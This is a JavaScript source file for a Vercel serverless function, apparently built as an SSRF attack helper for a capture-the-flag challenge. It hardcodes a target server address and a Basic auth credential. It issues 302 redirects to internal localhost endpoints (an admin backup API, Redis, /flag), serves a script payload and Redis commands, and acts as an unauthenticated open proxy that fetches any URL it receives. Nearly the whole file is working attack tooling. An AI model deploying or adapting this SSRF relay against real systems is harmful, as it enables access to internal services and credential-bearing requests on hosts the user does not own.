// api/proxy.js - Vercel serverless function for SSRF
export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Configuration - YOUR CTF target
    const config = {
        ctfServer: '15.206.47.5:5000',
        userId: 'f2f96855-8c05-4599-a98c-f7f2fd718fa2',
        basicAuth: 'YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu'
    };
    
    // Log the request for debugging
    console.log(`SSRF Proxy Request: ${req.method} ${req.url}`);
    console.log('Query params:', req.query);
    console.log('Headers:', req.headers);
    
    // Handle GET requests (when CTF server makes SSRF request to us)
    if (req.method === 'GET') {
        const { target, endpoint, url, redirect } = req.query;
        
        // Handle redirect requests - THIS IS THE KEY!
        if (redirect) {
            const redirectTargets = {
                'admin': 'http://127.0.0.1:5000/api/admin/backup/generate',
                'redis': 'http://127.0.0.1:6379/',
                'localhost': 'http://localhost:5000/api/admin/backup/generate',
                'flag': 'http://127.0.0.1:5000/flag',
                'api': 'http://localhost:5000/api/',
                'custom': redirect
            };
            
            const redirectUrl = redirectTargets[redirect] || redirect;
            
            console.log(`Redirecting to: ${redirectUrl}`);
            
            // Return a 302 redirect
            res.setHeader('Location', redirectUrl);
            return res.status(302).send(`Redirecting to ${redirectUrl}`);
        }
        
        // If no specific target, return a response that helps identify the proxy is working
        if (!target && !endpoint && !url) {
            const proxyInfo = `SSRF Proxy Active!
Timestamp: ${new Date().toISOString()}
Server: Vercel Serverless Function
CTF Target: ${config.ctfServer}

Available endpoints:
- ?target=admin (Admin backup endpoint)
- ?target=redis (Redis access)
- ?target=localhost (Internal localhost)
- ?url=CUSTOM_URL (Custom target)

This response means your SSRF payload reached the proxy successfully!
Now trying to access internal admin endpoint...
`;

            // Also try to make a request to the admin endpoint
            try {
                const adminUrl = `http://${config.ctfServer}/api/admin/backup/generate`;
                const adminResponse = await fetch(adminUrl, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Basic ${config.basicAuth}`,
                        'Content-Type': 'application/json',
                        'User-Agent': 'SSRF-Proxy/1.0'
                    },
                    body: JSON.stringify({
                        user_id: config.userId
                    }),
                    timeout: 10000
                });
                
                const adminResult = await adminResponse.text();
                
                return res.status(200).send(`${proxyInfo}

=== ADMIN ENDPOINT RESPONSE ===
Status: ${adminResponse.status}
Response:
${adminResult}

🎉 If you see this, the SSRF proxy is working!
`);
                
            } catch (adminError) {
                return res.status(200).send(`${proxyInfo}

=== ADMIN ENDPOINT ATTEMPT ===
Error: ${adminError.message}
This might be because we're making an external request to the CTF server.
The real magic happens when the CTF server makes SSRF requests to localhost through us!
`);
            }
        }
        
        // Handle specific targets
        let targetUrl = url;
        
        if (target === 'admin' || endpoint === 'admin') {
            // When the CTF server requests this, we return content that includes localhost requests
            return res.status(200).send(`Admin Endpoint Response
Timestamp: ${new Date().toISOString()}

This is a response that could trigger further SSRF:
<script>fetch('http://127.0.0.1:5000/api/admin/backup/generate')</script>

Or embed this URL: http://127.0.0.1:5000/api/admin/backup/generate

Flag might be here: CHECK_ADMIN_BACKUP_ENDPOINT_FOR_FLAG
User ID: ${config.userId}
Auth: Basic ${config.basicAuth}
`);
        } else if (target === 'redis' || endpoint === 'redis') {
            return res.status(200).send(`Redis Access Response
Timestamp: ${new Date().toISOString()}

Trying Redis: http://127.0.0.1:6379/
Alternative: http://localhost:6379/

Redis Info Command: *1\\r\\n$4\\r\\nINFO\\r\\n
`);
        } else if (target === 'localhost' || endpoint === 'localhost') {
            return res.status(200).send(`Localhost Proxy Response
Timestamp: ${new Date().toISOString()}

Internal Admin URL: http://127.0.0.1:5000/api/admin/backup/generate
Internal Redis URL: http://127.0.0.1:6379/

Method: POST
Headers: Authorization: Basic ${config.basicAuth}
Data: {"user_id":"${config.userId}"}

Check these internal endpoints for the flag!
`);
        }
        
        // For custom URLs, try to make the request if it's safe
        if (targetUrl) {
            try {
                console.log(`Making request to custom URL: ${targetUrl}`);
                
                const response = await fetch(targetUrl, {
                    method: 'GET',
                    headers: {
                        'User-Agent': 'SSRF-Proxy/1.0'
                    },
                    timeout: 10000
                });
                
                const result = await response.text();
                
                return res.status(200).send(`Custom URL Response
Target: ${targetUrl}
Status: ${response.status}
Timestamp: ${new Date().toISOString()}

Response:
${result}
`);
                
            } catch (error) {
                return res.status(200).send(`Custom URL Error
Target: ${targetUrl}
Error: ${error.message}
Timestamp: ${new Date().toISOString()}
`);
            }
        }
    }
    
    // Handle POST requests (for testing from the web interface)
    if (req.method === 'POST') {
        const { url, method = 'GET', headers = {}, data } = req.body;
        
        if (!url) {
            return res.status(400).json({ error: 'URL is required' });
        }
        
        try {
            console.log(`API Test: Making ${method} request to ${url}`);
            
            const requestOptions = {
                method: method,
                headers: {
                    'User-Agent': 'API-Test/1.0',
                    ...headers
                },
                timeout: 15000
            };
            
            if (data && (method === 'POST' || method === 'PUT')) {
                requestOptions.body = JSON.stringify(data);
            }
            
            const response = await fetch(url, requestOptions);
            const responseText = await response.text();
            
            console.log(`API Test: Response from ${url}: ${response.status}`);
            
            return res.status(200).json({
                success: response.ok,
                status: response.status,
                headers: Object.fromEntries(response.headers.entries()),
                body: responseText,
                timestamp: new Date().toISOString(),
                request: {
                    url: url,
                    method: method,
                    headers: requestOptions.headers
                }
            });
            
        } catch (error) {
            console.error('API Test error:', error);
            return res.status(200).json({
                success: false,
                error: error.message,
                timestamp: new Date().toISOString()
            });
        }
    }
    
    return res.status(405).json({ error: 'Method not allowed' });
}
